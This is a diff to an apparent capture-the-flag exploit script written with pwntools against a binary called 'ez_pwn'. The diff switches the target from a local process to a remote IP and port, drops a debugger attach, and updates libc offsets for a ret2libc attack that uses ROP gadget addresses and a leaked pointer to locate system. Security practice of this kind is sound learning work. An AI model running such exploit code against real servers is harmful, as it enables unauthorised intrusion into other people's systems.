@@ -1,11 +1,12 @@
 from pwn import *
 context.log_level = 'debug'
-p = process('./ez_pwn')
+#p = process('./ez_pwn')
+p = remote('163.152.225.231', 12355)
 e = ELF('./ez_pwn')
 pppr = 0x080489c9
 pr = 0x0804849d
 
-gdb.attach(p)
+#gdb.attach(p)
 p.recvuntil('3. Bye~~')
 p.sendline('1')
 
@@ -49,8 +50,8 @@ p.sendline(pay)
 p.recvuntil('\n')
 
 leak = u32(p.recv(4))
-libc = leak - 0x5fcb0
-system = libc + 0x3adb0
+libc = leak - 0x05f150
+system = libc + 0x03a950
 
 print(hex(leak))
 
